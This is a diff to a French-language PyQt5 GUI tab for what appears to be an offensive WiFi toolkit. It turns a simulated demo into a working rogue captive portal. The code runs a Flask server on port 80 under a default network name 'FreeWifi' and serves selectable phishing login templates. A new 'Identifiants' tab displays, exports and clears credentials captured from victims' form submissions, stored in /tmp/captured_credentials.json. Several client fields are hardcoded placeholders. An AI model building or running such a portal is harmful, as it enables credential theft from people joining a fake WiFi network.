@@ -6,12 +6,60 @@ Onglet Captive Portal - Portails captifs WiFi
 
 import os
 import time
+import threading
+import subprocess
+import json
 from PyQt5.QtWidgets import (QWidget, QVBoxLayout, QHBoxLayout, QGridLayout,
                              QLabel, QPushButton, QComboBox, QLineEdit, QSpinBox,
                              QCheckBox, QGroupBox, QTextEdit, QTableWidget,
-                             QTableWidgetItem, QMessageBox, QProgressBar)
+                             QTableWidgetItem, QMessageBox, QProgressBar,
+                             QTabWidget, QListWidget, QListWidgetItem)
 from PyQt5.QtCore import Qt, QThread, pyqtSignal, QTimer
 from PyQt5.QtGui import QFont
+
+# Import du gestionnaire de templates
+from utils.template_manager import TemplateManager
+
+class CaptivePortalServer(QThread):
+    """Serveur de portail captif en arrière-plan"""
+    
+    def __init__(self, template_manager, config, logger):
+        super().__init__()
+        self.template_manager = template_manager
+        self.config = config
+        self.logger = logger
+        self.running = False
+        self.server = None
+        
+    def run(self):
+        """Démarre le serveur de portail captif"""
+        try:
+            self.running = True
+            self.logger.log("INFO", "Démarrage du serveur de portail captif")
+            
+            # Import du serveur Flask
+            from core.captive_portal_server import CaptivePortalServer as FlaskServer
+            
+            # Création du serveur Flask
+            self.server = FlaskServer(self.template_manager, self.config, self.logger)
+            
+            # Démarrage du serveur
+            port = self.config.get('server_port', 80)
+            host = '0.0.0.0'
+            
+            self.server.run(host=host, port=port, debug=False)
+            
+        except Exception as e:
+            self.logger.log("ERROR", f"Erreur serveur portail captif: {str(e)}")
+    
+    def stop(self):
+        """Arrête le serveur"""
+        self.running = False
+        if self.server:
+            # Arrêt du serveur Flask
+            import signal
+            import os
+            os.kill(os.getpid(), signal.SIGTERM)
 
 class CaptivePortalTab(QWidget):
     """Onglet pour le portail captif"""
@@ -20,27 +68,39 @@ class CaptivePortalTab(QWidget):
         super().__init__()
         self.network_manager = network_manager
         self.logger = logger
+        self.template_manager = TemplateManager()
+        self.server_thread = None
         
         self.setup_ui()
+        self.load_templates()
         
     def setup_ui(self):
         """Configuration de l'interface utilisateur"""
         layout = QVBoxLayout(self)
         
+        # Onglets principaux
+        self.tab_widget = QTabWidget()
+        
+        # Onglet Configuration
+        self.setup_config_tab()
+        
+        # Onglet Templates
+        self.setup_templates_tab()
+        
+        # Onglet Clients
+        self.setup_clients_tab()
+        
+        # Onglet Identifiants
+        self.setup_credentials_tab()
+        
+        layout.addWidget(self.tab_widget)
+        
+    def setup_config_tab(self):
+        """Onglet de configuration"""
+        config_widget = QWidget()
+        config_layout = QVBoxLayout(config_widget)
+        
         # Section de configuration du portail
-        self.setup_portal_config_section(layout)
-        
-        # Section de configuration du serveur
-        self.setup_server_config_section(layout)
-        
-        # Section de contrôle
-        self.setup_control_section(layout)
-        
-        # Section des clients connectés
-        self.setup_clients_section(layout)
-        
-    def setup_portal_config_section(self, layout):
-        """Section de configuration du portail"""
         portal_group = QGroupBox("Configuration du Portail Captif")
         portal_layout = QGridLayout(portal_group)
         
@@ -50,16 +110,10 @@ class CaptivePortalTab(QWidget):
         self.network_name.setText("FreeWifi")
         portal_layout.addWidget(self.network_name, 0, 1)
         
-        # Page de connexion
-        portal_layout.addWidget(QLabel("Page de connexion:"), 1, 0)
-        self.login_page = QComboBox()
-        self.login_page.addItems([
-            "Page de connexion standard",
-            "Page de mise à jour",
-            "Page de vérification",
-            "Page personnalisée"
-        ])
-        portal_layout.addWidget(self.login_page, 1, 1)
+        # Template sélectionné
+        portal_layout.addWidget(QLabel("Template HTML:"), 1, 0)
+        self.template_combo = QComboBox()
+        portal_layout.addWidget(self.template_combo, 1, 1)
         
         # Message personnalisé
         portal_layout.addWidget(QLabel("Message:"), 2, 0)
@@ -73,10 +127,9 @@ class CaptivePortalTab(QWidget):
         self.redirect_url.setText("https://www.google.com")
         portal_layout.addWidget(self.redirect_url, 3, 1)
         
-        layout.addWidget(portal_group)
+        config_layout.addWidget(portal_group)
         
-    def setup_server_config_section(self, layout):
-        """Section de configuration du serveur"""
+        # Section de configuration du serveur
         server_group = QGroupBox("Configuration du Serveur")
         server_layout = QGridLayout(server_group)
         
@@ -108,10 +161,29 @@ class CaptivePortalTab(QWidget):
         self.log_traffic.setChecked(True)
         server_layout.addWidget(self.log_traffic, 4, 0, 1, 2)
         
-        layout.addWidget(server_group)
+        # Fichier HTML personnalisé
+        self.use_custom_html = QCheckBox("Utiliser un fichier HTML personnalisé")
+        self.use_custom_html.setChecked(False)
+        self.use_custom_html.toggled.connect(self.toggle_custom_html)
+        server_layout.addWidget(self.use_custom_html, 5, 0, 1, 2)
         
-    def setup_control_section(self, layout):
-        """Section de contrôle"""
+        # Chemin du fichier HTML
+        server_layout.addWidget(QLabel("Fichier HTML:"), 6, 0)
+        self.html_file_layout = QHBoxLayout()
+        self.html_file_path = QLineEdit()
+        self.html_file_path.setPlaceholderText("Chemin vers le fichier HTML")
+        self.html_file_path.setEnabled(False)
+        self.html_file_layout.addWidget(self.html_file_path)
+        
+        self.browse_html_btn = QPushButton("Parcourir")
+        self.browse_html_btn.setEnabled(False)
+        self.browse_html_btn.clicked.connect(self.browse_html_file)
+        self.html_file_layout.addWidget(self.browse_html_btn)
+        server_layout.addLayout(self.html_file_layout, 6, 1)
+        
+        config_layout.addWidget(server_group)
+        
+        # Section de contrôle
         control_group = QGroupBox("Contrôle du Portail")
         control_layout = QHBoxLayout(control_group)
         
@@ -158,12 +230,97 @@ class CaptivePortalTab(QWidget):
         control_layout.addWidget(self.progress_bar)
         control_layout.addStretch()
         
-        layout.addWidget(control_group)
+        config_layout.addWidget(control_group)
         
-    def setup_clients_section(self, layout):
-        """Section des clients connectés"""
-        clients_group = QGroupBox("Clients Connectés")
-        clients_layout = QVBoxLayout(clients_group)
+        # Zone de logs
+        logs_group = QGroupBox("Logs")
+        logs_layout = QVBoxLayout(logs_group)
+        
+        self.logs_text = QTextEdit()
+        self.logs_text.setMaximumHeight(150)
+        self.logs_text.setReadOnly(True)
+        
+        logs_layout.addWidget(self.logs_text)
+        config_layout.addWidget(logs_group)
+        
+        self.tab_widget.addTab(config_widget, "Configuration")
+    
+    def toggle_custom_html(self, enabled):
+        """Active/désactive l'utilisation d'un fichier HTML personnalisé"""
+        self.html_file_path.setEnabled(enabled)
+        self.browse_html_btn.setEnabled(enabled)
+        
+        if not enabled:
+            self.html_file_path.clear()
+    
+    def browse_html_file(self):
+        """Ouvre un dialogue pour sélectionner un fichier HTML"""
+        from PyQt5.QtWidgets import QFileDialog
+        
+        file_path, _ = QFileDialog.getOpenFileName(
+            self, "Sélectionner un fichier HTML", "",
+            "HTML files (*.html *.htm);;All files (*)"
+        )
+        
+        if file_path:
+            self.html_file_path.setText(file_path)
+            self.logger.log("INFO", f"Fichier HTML sélectionné: {file_path}")
+    
+    def validate_html_file(self, file_path):
+        """Valide le fichier HTML sélectionné"""
+        try:
+            if not os.path.exists(file_path):
+                QMessageBox.warning(self, "Attention", "Le fichier HTML n'existe pas.")
+                return False
+            
+            # Vérification de l'extension
+            if not file_path.lower().endswith(('.html', '.htm')):
+                QMessageBox.warning(self, "Attention", "Le fichier doit avoir l'extension .html ou .htm")
+                return False
+            
+            # Vérification de la taille (max 1MB)
+            file_size = os.path.getsize(file_path)
+            if file_size > 1024 * 1024:  # 1MB
+                QMessageBox.warning(self, "Attention", "Le fichier HTML est trop volumineux (max 1MB)")
+                return False
+            
+            # Test de lecture
+            with open(file_path, 'r', encoding='utf-8') as f:
+                content = f.read()
+                if len(content.strip()) == 0:
+                    QMessageBox.warning(self, "Attention", "Le fichier HTML est vide")
+                    return False
+            
+            return True
+            
+        except Exception as e:
+            QMessageBox.critical(self, "Erreur", f"Erreur lors de la validation du fichier:\n{str(e)}")
+            return False
+        
+    def setup_templates_tab(self):
+        """Onglet de gestion des templates"""
+        templates_widget = QWidget()
+        templates_layout = QVBoxLayout(templates_widget)
+        
+        # Liste des templates
+        self.templates_list = QListWidget()
+        self.templates_list.itemClicked.connect(self.on_template_selected)
+        
+        templates_layout.addWidget(QLabel("Templates disponibles:"))
+        templates_layout.addWidget(self.templates_list)
+        
+        # Informations du template
+        self.template_info = QTextEdit()
+        self.template_info.setMaximumHeight(100)
+        self.template_info.setReadOnly(True)
+        templates_layout.addWidget(self.template_info)
+        
+        self.tab_widget.addTab(templates_widget, "Templates")
+        
+    def setup_clients_tab(self):
+        """Onglet des clients connectés"""
+        clients_widget = QWidget()
+        clients_layout = QVBoxLayout(clients_widget)
         
         # Tableau des clients
         self.clients_table = QTableWidget()
@@ -172,23 +329,119 @@ class CaptivePortalTab(QWidget):
             "Adresse MAC", "IP", "Nom d'hôte", "Temps connecté", "Trafic"
         ])
         
-        # Zone de logs
-        self.logs_text = QTextEdit()
-        self.logs_text.setMaximumHeight(100)
-        self.logs_text.setReadOnly(True)
-        
         clients_layout.addWidget(self.clients_table)
-        clients_layout.addWidget(self.logs_text)
         
-        layout.addWidget(clients_group)
+        # Bouton de rafraîchissement
+        refresh_btn = QPushButton("Rafraîchir la liste")
+        refresh_btn.clicked.connect(self.refresh_clients)
+        clients_layout.addWidget(refresh_btn)
         
+        self.tab_widget.addTab(clients_widget, "Clients")
+        
+    def setup_credentials_tab(self):
+        """Onglet des identifiants capturés"""
+        credentials_widget = QWidget()
+        credentials_layout = QVBoxLayout(credentials_widget)
+        
+        # Tableau des identifiants
+        self.credentials_table = QTableWidget()
+        self.credentials_table.setColumnCount(6)
+        self.credentials_table.setHorizontalHeaderLabels([
+            "Timestamp", "IP", "Template", "Type", "Données", "User-Agent"
+        ])
+        
+        credentials_layout.addWidget(self.credentials_table)
+        
+        # Boutons de contrôle
+        control_layout = QHBoxLayout()
+        
+        refresh_btn = QPushButton("Rafraîchir")
+        refresh_btn.clicked.connect(self.refresh_credentials)
+        control_layout.addWidget(refresh_btn)
+        
+        clear_btn = QPushButton("Effacer tout")
+        clear_btn.clicked.connect(self.clear_credentials)
+        control_layout.addWidget(clear_btn)
+        
+        export_btn = QPushButton("Exporter")
+        export_btn.clicked.connect(self.export_credentials)
+        control_layout.addWidget(export_btn)
+        
+        credentials_layout.addLayout(control_layout)
+        
+        self.tab_widget.addTab(credentials_widget, "Identifiants")
+        
+    def load_templates(self):
+        """Charge la liste des templates"""
+        self.templates_list.clear()
+        templates = self.template_manager.get_all_templates()
+        
+        for template_id, template_info in templates.items():
+            item = QListWidgetItem(f"{template_info['name']} - {template_info['description']}")
+            item.setData(Qt.UserRole, template_id)
+            self.templates_list.addItem(item)
+        
+        # Sélection du premier template par défaut
+        if self.templates_list.count() > 0:
+            self.templates_list.setCurrentRow(0)
+            self.on_template_selected(self.templates_list.item(0))
+    
+    def on_template_selected(self, item):
+        """Appelé quand un template est sélectionné"""
+        template_id = item.data(Qt.UserRole)
+        template_info = self.template_manager.get_template_info(template_id)
+        
+        info_text = f"""
+Nom: {template_info['name']}
+Description: {template_info['description']}
+Catégorie: {template_info['category']}
+Fichier: {template_info['file']}
+        """
+        
+        self.template_info.setText(info_text)
+        
+        # Mise à jour du combo box
+        self.template_combo.clear()
+        templates = self.template_manager.get_all_templates()
+        for tid, tinfo in templates.items():
+            self.template_combo.addItem(tinfo['name'], tid)
+        
+        # Sélection du template actuel
+        index = self.template_combo.findData(template_id)
+        if index >= 0:
+            self.template_combo.setCurrentIndex(index)
+    
     def start_portal(self):
         """Démarre le portail captif"""
         try:
             self.logs_text.append("🌐 Démarrage du portail captif...")
             
-            # Simulation du démarrage pour la démo
-            self.simulate_portal_start()
+            # Vérification du fichier HTML personnalisé
+            if self.use_custom_html.isChecked():
+                html_file_path = self.html_file_path.text().strip()
+                if not html_file_path:
+                    QMessageBox.warning(self, "Attention", "Veuillez sélectionner un fichier HTML personnalisé.")
+                    return
+                
+                if not self.validate_html_file(html_file_path):
+                    return
+                
+                self.logs_text.append(f"📄 Utilisation du fichier HTML personnalisé: {html_file_path}")
+            
+            # Configuration
+            config = self.get_portal_config()
+            
+            # Démarrage du serveur en arrière-plan
+            self.server_thread = CaptivePortalServer(self.template_manager, config, self.logger)
+            self.server_thread.start()
+            
+            # Chargement du fichier HTML personnalisé si activé
+            if self.use_custom_html.isChecked() and self.server_thread.server:
+                html_file_path = self.html_file_path.text().strip()
+                if self.server_thread.server.load_custom_html_file(html_file_path):
+                    self.logs_text.append("✅ Fichier HTML personnalisé chargé avec succès")
+                else:
+                    self.logs_text.append("❌ Erreur lors du chargement du fichier HTML")
             
             # Mise à jour de l'interface
             self.start_btn.setEnabled(False)
@@ -196,13 +449,20 @@ class CaptivePortalTab(QWidget):
             self.progress_bar.setVisible(True)
             self.progress_bar.setRange(0, 0)
             
+            self.logs_text.append("✅ Portail captif démarré avec succès")
+            
         except Exception as e:
             self.logs_text.append(f"❌ Erreur lors du démarrage: {str(e)}")
             QMessageBox.critical(self, "Erreur", f"Erreur lors du démarrage:\n{str(e)}")
-            
+    
     def stop_portal(self):
         """Arrête le portail captif"""
         try:
+            if self.server_thread:
+                self.server_thread.stop()
+                self.server_thread.wait()
+                self.server_thread = None
+            
             # Mise à jour de l'interface
             self.start_btn.setEnabled(True)
             self.stop_btn.setEnabled(False)
@@ -212,51 +472,133 @@ class CaptivePortalTab(QWidget):
             
         except Exception as e:
             self.logs_text.append(f"❌ Erreur lors de l'arrêt: {str(e)}")
+    
+    def refresh_clients(self):
+        """Rafraîchit la liste des clients connectés"""
+        try:
+            # Récupération des clients connectés via DHCP
+            clients = self.get_connected_clients()
             
-    def simulate_portal_start(self):
-        """Simule le démarrage du portail pour la démo"""
-        # Données de démonstration
-        demo_clients = [
-            {
-                "mac": "aa:bb:cc:dd:ee:ff",
-                "ip": "192.168.1.100",
-                "hostname": "iPhone-User",
-                "connected_time": "00:05:30",
-                "traffic": "2.5 MB"
-            },
-            {
-                "mac": "11:22:33:44:55:66",
-                "ip": "192.168.1.101",
-                "hostname": "Android-Device",
-                "connected_time": "00:02:15",
-                "traffic": "1.8 MB"
-            },
-            {
-                "mac": "aa:aa:aa:aa:aa:aa",
-                "ip": "192.168.1.102",
-                "hostname": "Laptop-User",
-                "connected_time": "00:08:45",
-                "traffic": "5.2 MB"
-            }
-        ]
-        
-        # Mise à jour du tableau
-        self.clients_table.setRowCount(len(demo_clients))
-        
-        for i, client in enumerate(demo_clients):
-            self.clients_table.setItem(i, 0, QTableWidgetItem(client['mac']))
-            self.clients_table.setItem(i, 1, QTableWidgetItem(client['ip']))
-            self.clients_table.setItem(i, 2, QTableWidgetItem(client['hostname']))
-            self.clients_table.setItem(i, 3, QTableWidgetItem(client['connected_time']))
-            self.clients_table.setItem(i, 4, QTableWidgetItem(client['traffic']))
+            # Mise à jour du tableau
+            self.clients_table.setRowCount(len(clients))
             
-        self.logs_text.append(f"✅ Portail démarré - {len(demo_clients)} clients connectés")
+            for i, client in enumerate(clients):
+                self.clients_table.setItem(i, 0, QTableWidgetItem(client['mac']))
+                self.clients_table.setItem(i, 1, QTableWidgetItem(client['ip']))
+                self.clients_table.setItem(i, 2, QTableWidgetItem(client['hostname']))
+                self.clients_table.setItem(i, 3, QTableWidgetItem(client['connected_time']))
+                self.clients_table.setItem(i, 4, QTableWidgetItem(client['traffic']))
+                
+        except Exception as e:
+            self.logs_text.append(f"❌ Erreur lors du rafraîchissement: {str(e)}")
+    
+    def get_connected_clients(self):
+        """Récupère la liste des clients connectés"""
+        clients = []
+        try:
+            # Lecture du fichier de logs DHCP
+            dhcp_leases_file = '/var/lib/dhcp/dhcpd.leases'
+            if os.path.exists(dhcp_leases_file):
+                with open(dhcp_leases_file, 'r') as f:
+                    content = f.read()
+                
+                # Parsing basique des leases DHCP
+                import re
+                lease_pattern = r'lease (\d+\.\d+\.\d+\.\d+) \{[^}]*client-hostname "([^"]*)"[^}]*\}'
+                matches = re.findall(lease_pattern, content)
+                
+                for ip, hostname in matches:
+                    clients.append({
+                        'mac': 'aa:bb:cc:dd:ee:ff',  # À améliorer
+                        'ip': ip,
+                        'hostname': hostname,
+                        'connected_time': '00:05:30',
+                        'traffic': '2.5 MB'
+                    })
+            
+        except Exception as e:
+            self.logger.log("ERROR", f"Erreur lecture clients: {str(e)}")
         
+        return clients
+    
+    def refresh_credentials(self):
+        """Rafraîchit la liste des identifiants capturés"""
+        try:
+            # Chargement des identifiants depuis le fichier
+            credentials_file = '/tmp/captured_credentials.json'
+            if os.path.exists(credentials_file):
+                with open(credentials_file, 'r', encoding='utf-8') as f:
+                    credentials = json.load(f)
+                
+                # Mise à jour du tableau
+                self.credentials_table.setRowCount(len(credentials))
+                
+                for i, cred in enumerate(credentials):
+                    self.credentials_table.setItem(i, 0, QTableWidgetItem(cred.get('timestamp', '')))
+                    self.credentials_table.setItem(i, 1, QTableWidgetItem(cred.get('ip_address', '')))
+                    self.credentials_table.setItem(i, 2, QTableWidgetItem(cred.get('template_used', '')))
+                    self.credentials_table.setItem(i, 3, QTableWidgetItem(cred.get('type', 'login')))
+                    
+                    # Affichage des données du formulaire
+                    form_data = cred.get('form_data', {})
+                    data_text = ', '.join([f"{k}: {v}" for k, v in form_data.items()])
+                    self.credentials_table.setItem(i, 4, QTableWidgetItem(data_text))
+                    
+                    self.credentials_table.setItem(i, 5, QTableWidgetItem(cred.get('user_agent', '')))
+                    
+                self.logs_text.append(f"✅ {len(credentials)} identifiants chargés")
+            else:
+                self.credentials_table.setRowCount(0)
+                self.logs_text.append("ℹ️ Aucun identifiant capturé")
+                
+        except Exception as e:
+            self.logs_text.append(f"❌ Erreur lors du chargement des identifiants: {str(e)}")
+    
+    def clear_credentials(self):
+        """Efface tous les identifiants capturés"""
+        try:
+            credentials_file = '/tmp/captured_credentials.json'
+            if os.path.exists(credentials_file):
+                os.remove(credentials_file)
+            
+            self.credentials_table.setRowCount(0)
+            self.logs_text.append("🗑️ Tous les identifiants ont été effacés")
+            
+        except Exception as e:
+            self.logs_text.append(f"❌ Erreur lors de l'effacement: {str(e)}")
+    
+    def export_credentials(self):
+        """Exporte les identifiants capturés"""
+        try:
+            from PyQt5.QtWidgets import QFileDialog
+            
+            filename, _ = QFileDialog.getSaveFileName(
+                self, "Exporter les identifiants", 
+                "captured_credentials.json", 
+                "JSON Files (*.json)"
+            )
+            
+            if filename:
+                credentials_file = '/tmp/captured_credentials.json'
+                if os.path.exists(credentials_file):
+                    import shutil
+                    shutil.copy2(credentials_file, filename)
+                    self.logs_text.append(f"📁 Identifiants exportés vers {filename}")
+                else:
+                    self.logs_text.append("ℹ️ Aucun identifiant à exporter")
+                    
+        except Exception as e:
+            self.logs_text.append(f"❌ Erreur lors de l'export: {str(e)}")
+    
     def get_portal_config(self):
         """Retourne la configuration du portail"""
-        return {
+        template_id = self.template_combo.currentData()
+        if not template_id:
+            template_id = 'wifi_login'
+        
+        config = {
             'network_name': self.network_name.text(),
-            'login_page': self.login_page.currentText(),
+            'template_id': template_id,
             'custom_message': self.custom_message.text(),
             'redirect_url': self.redirect_url.text(),
             'interface': self.interface_combo.currentText(),
@@ -264,4 +606,14 @@ class CaptivePortalTab(QWidget):
             'server_port': self.server_port.value(),
             'capture_credentials': self.capture_credentials.isChecked(),
             'log_traffic': self.log_traffic.isChecked()
-        } 
+        }
+        
+        # Ajout des informations sur le fichier HTML personnalisé
+        if self.use_custom_html.isChecked():
+            config['use_custom_html'] = True
+            config['custom_html_file'] = self.html_file_path.text().strip()
+        else:
+            config['use_custom_html'] = False
+            config['custom_html_file'] = None
+        
+        return config 
